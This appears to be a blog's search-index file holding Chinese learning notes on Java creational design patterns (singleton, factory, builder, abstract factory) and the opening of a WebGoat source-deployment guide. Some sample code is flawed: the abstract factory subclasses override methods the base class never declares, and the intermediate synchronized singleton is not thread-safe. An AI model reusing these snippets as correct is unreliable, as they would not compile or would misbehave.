<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>创建型-单例模式</title>
    <url>/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//用于引用全局唯一的单例对象，在一开始就创建好</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//不允许随便new</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">//获取全局唯一的单例对象</span><br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Singleton.getInstance();<br>        System.out.println(instance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="懒汉式"><a href="#懒汉式" class="headerlink" title="懒汉式"></a>懒汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">//在一开始不创建对象</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">//如果实例为空就创建</span><br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>但是这种方法有种缺陷，由于懒汉式在方法中进行初始化，在多线程的环境下，可能会出现问题。</p>
<h3 id="懒汉式-改进"><a href="#懒汉式-改进" class="headerlink" title="懒汉式-改进"></a>懒汉式-改进</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>但是这种效率比较低，只能又一个线程能进入同步块，其他的必须要等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//双重检查</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>双重检查可以确保在多线程环境下也能保持单例的唯一性，同时尽可能地减少了同步的开销。</p>
<h3 id="JAVA特有的写法"><a href="#JAVA特有的写法" class="headerlink" title="JAVA特有的写法"></a>JAVA特有的写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> &#123;  <span class="hljs-comment">//由静态内部类持有单例对象，根据类加载的特性，仅使用Singleton类时，不会对静态内部类进行初始化</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">//只有真正使用内部类时，才会进行类初始化</span><br>        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>在Java中，静态内部类在被使用之前是不会被初始化的，这是由类加载器的工作原理决定的。</p>
<p>当程序第一次访问静态内部类 <code>SingletonHolder</code> 时，JVM 会加载 <code>SingletonHolder</code> 类。这个加载过程是延迟的，只有在真正需要使用 <code>SingletonHolder</code> 类时才会触发。所以，即使 <code>Singleton</code> 类被加载了，但是不会导致 <code>SingletonHolder</code> 类被加载，也就不会创建单例对象。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-工厂模式</title>
    <url>/2024/05/03/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	为了写出更“优雅”的代码，遂准备来学习JAVA的设计模式。</p>
<p>​	以前从来没有写文章的习惯，发现学过的东西容易忘记，也可能是学的过于表面，不够深入，了解了费曼学习法，决定开始码文章，当作学习记录吧，也方便回顾。</p>
<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>​	JAVA的设计模式分为三类，创建型模式（关注对象的创建机制）、结构性模式（关注类和对象之间的组合）、行为型模式（关注对象之间的通信以及责任的分配）</p>
<h2 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//水果抽象类</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Fruit</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name +<span class="hljs-string">&quot;@&quot;</span>+hashCode();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//继承水果</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;苹果&quot;</span>);<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Orange</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123;	<span class="hljs-comment">//继承水果</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Orange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;橘子&quot;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimplefruitFactory</span> &#123; <span class="hljs-comment">//水果工厂</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Fruit <span class="hljs-title function_">getFruit</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (type) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;苹果&quot;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;橘子&quot;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 处理未知类型</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> SimplefruitFactory.getFruit(<span class="hljs-string">&quot;橘子&quot;</span>); <span class="hljs-comment">//通过工厂创建</span><br>        System.out.println(fruit);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​	这样做的好处是，比如Apple的构造方法需要新的参数，我们只需要修改工厂里面的参数，因为其他地方是通过工厂获得的水果的实例。</p>
<p>假如现在需要增加一个新的水果类型，就需要对工厂进行修改。这不符合开闭原则。（开闭原则：一个软件实体，比如类、模块和函数应该对扩展开放，对修改关闭）。</p>
<h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FruitFactory</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span>&gt;&#123; <span class="hljs-comment">//将水果工厂抽象为抽象类，通过泛型指定水果类型</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> T <span class="hljs-title function_">getFruit</span><span class="hljs-params">()</span>;  <span class="hljs-comment">//不同的水果工厂，生产不同的水果</span><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleFactora</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FruitFactory</span>&lt;Apple&gt;&#123; <span class="hljs-comment">//假如需要苹果就创建一个苹果工厂类，新增橘子，蓝莓，等等同理</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Apple <span class="hljs-title function_">getFruit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Apple</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleFactora</span>().getFruit();<br>        System.out.println(fruit);<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p>​	屏蔽了对象的创建细节，使用者只需要关心如何使用对象，降低了客户端与对象之间的耦合度。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-建造者模式</title>
    <url>/2024/05/08/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> age;<br>    String name;<br>    String gender; <br>    String profession;<br>    List&lt;String&gt; awards;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender; <br>        <span class="hljs-built_in">this</span>.profession = profession;<br>        <span class="hljs-built_in">this</span>.awards = awards;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>学生类的属性非常多，导致构造函数，也非常多，如果我们通过new的方式创建很容易填错参数位置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;String&gt; awards = Arrays.asList(<span class="hljs-string">&quot;LPL 春季赛冠军&quot;</span>,<span class="hljs-string">&quot;上海Major冠军&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;小明&quot;</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;计算机科学与技术&quot;</span>, awards);<br>        System.out.println(student);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> age;<br>    String name;<br>    String gender; <br>    String profession;<br>    List&lt;String&gt; awards;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender; <br>        <span class="hljs-built_in">this</span>.profession = profession;<br>        <span class="hljs-built_in">this</span>.awards = awards;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StudentBuilder <span class="hljs-title function_">builder</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//通过builder直接获取建造者</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StudentBuilder</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentBuilder</span> &#123;<br>        <span class="hljs-type">int</span> id;<br>        <span class="hljs-type">int</span> age;<br>        String name;<br>        String gender;<br>        String profession;<br>        List&lt;String&gt; awards;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">id</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>            <span class="hljs-built_in">this</span>.id = id;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">age</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>            <span class="hljs-built_in">this</span>.age = age;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">name</span><span class="hljs-params">(String name)</span> &#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">gender</span><span class="hljs-params">(String gender)</span> &#123;<br>            <span class="hljs-built_in">this</span>.gender = gender;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">profession</span><span class="hljs-params">(String profession)</span> &#123;<br>            <span class="hljs-built_in">this</span>.profession = profession;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">awards</span><span class="hljs-params">(List&lt;String&gt; awards)</span> &#123;<br>            <span class="hljs-built_in">this</span>.awards = awards;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Student <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(id, age, name, gender, profession, awards);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Student.<span class="hljs-type">StudentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> Student.builder();<br>        List&lt;String&gt; awards = Arrays.asList(<span class="hljs-string">&quot;LPL 春季赛冠军&quot;</span>, <span class="hljs-string">&quot;上海Major冠军&quot;</span>);<br>        builder.id(<span class="hljs-number">1</span>).name(<span class="hljs-string">&quot;John Doe&quot;</span>).gender(<span class="hljs-string">&quot;Male&quot;</span>).awards(awards).profession(<span class="hljs-string">&quot;&quot;</span>).build();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><strong>建造者模式提供了一种清晰、灵活且易于维护的方式来构建对象，尤其适用于具有多个参数和复杂构建逻辑的情况。</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-抽象工厂模式</title>
    <url>/2024/05/07/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	工厂模式关注于创建单个对象，通过一个工厂类来实现。但是假如遇到需要创建一系列相关或相互依赖的对象的时候，就有些乏力了，而抽象工厂模式能很好的解决这个问题。</p>
<h2 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//水果抽象类</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Fruit</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name +<span class="hljs-string">&quot;@&quot;</span>+hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//水果实现类</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;苹果&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Orange</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//水果实现类</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Orange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;橘子&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;  <span class="hljs-comment">//抽象水果工厂</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Fruit <span class="hljs-title function_">getApple</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Fruit <span class="hljs-title function_">getOrange</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createApple</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createOrange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 在苹果工厂中不创建橘子</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrangeFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createApple</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 在橘子工厂中不创建苹果</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createOrange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AbstractFruitFactory</span> <span class="hljs-variable">appleFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleFactory</span>();<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">apple</span> <span class="hljs-operator">=</span> appleFactory.createApple();<br>        System.out.println(apple);<br><br>        <span class="hljs-type">AbstractFruitFactory</span> <span class="hljs-variable">orangeFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrangeFactory</span>();<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">orange</span> <span class="hljs-operator">=</span> orangeFactory.createOrange();<br>        System.out.println(orange);<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="工厂模式和抽象工厂模式的区别"><a href="#工厂模式和抽象工厂模式的区别" class="headerlink" title="工厂模式和抽象工厂模式的区别"></a>工厂模式和抽象工厂模式的区别</h2><p>​	<strong>工厂模式关注于创建单个对象，通常是通过一个工厂类来实现。</strong></p>
<p>​	<strong>工厂模式适用于创建单个对象的场景，抽象工厂模式适用于需要创建一系列相关对象的场景。</strong></p>
<p>​	<strong>抽象工厂模式则更加封闭，因为它需要一次性定义所有产品族的创建方法。</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>源码部署WebGoat</title>
    <url>/2024/05/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BA%90%E7%A0%81%E9%83%A8%E7%BD%B2Webgoat/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebGoat项目地址: <a href="https://github.com/WebGoat/WebGoat">WebGoat</a></p>
<p>需要JAVA17或者JAVA21，因为Spring boot3最低要求是JAVA17.</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529143754756.png" alt="image-20240529143754756"></p>
<h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/WebGoat/WebGoat.git<br></code></pre></td></tr></table></figure>

<h3 id="使用IDEA构建项目"><a href="#使用IDEA构建项目" class="headerlink" title="使用IDEA构建项目"></a>使用IDEA构建项目</h3><p>IDEA自带maven所以我们不需要单独下载</p>
